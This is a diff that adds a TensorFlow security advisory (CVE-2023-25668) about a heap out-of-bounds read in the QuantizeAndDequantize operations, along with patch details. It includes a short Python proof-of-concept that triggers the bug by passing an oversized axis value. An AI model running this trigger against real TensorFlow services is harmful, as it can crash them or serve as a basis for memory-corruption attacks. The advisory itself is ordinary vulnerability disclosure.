@@ -1,0 +1,26 @@
+<h2>TFSA-2023-002: A heap out-of-buffer read vulnerability in the QuantizeAndDequantize operation</h2>
+<h3>CVE Number</h3>
+<p>CVE-2023-25668</p>
+<h3>Impact</h3>
+<p>Attackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.
+When axis is larger than the dim of input, c-&gt;Dim(input,axis) goes out of bound.
+Same problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.
+<code>python
+import tensorflow as tf
+@tf.function
+def test():
+    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],
+                                       input_min=[1.0],
+                                       input_max=[10.0],
+                                       signed_input=True,
+                                       num_bits=1,
+                                       range_given=True,
+                                       round_mode='HALF_TO_EVEN',
+                                       narrow_range=True,
+                                       axis=0x7fffffff)
+test()</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb">7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb</a>.</p>
+<p>The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
